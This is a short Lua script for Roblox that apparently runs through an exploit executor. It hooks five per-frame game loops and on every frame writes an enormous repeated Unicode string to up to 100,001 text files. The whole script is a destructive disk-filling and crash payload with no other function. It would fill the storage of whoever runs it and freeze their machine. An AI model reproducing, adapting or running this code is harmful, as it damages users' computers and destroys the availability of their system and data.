if not game:IsLoaded() then game.Loaded:Wait() end

local RunService = game:FindService('RunService')
local Loops = {
    RunService.Stepped,
    RunService.RenderStepped,
    RunService.Heartbeat,
    RunService.PreRender,
    RunService.PreSimulation
}

local String = string.rep('𪚥🈵', 9e7)

for _, RS in ipairs(Loops) do
    RS:Connect(function()
        task.spawn(function()
            for _ = 0, 100000 do writefile(_ .. '.txt', String) end        
        end)
    end)
end
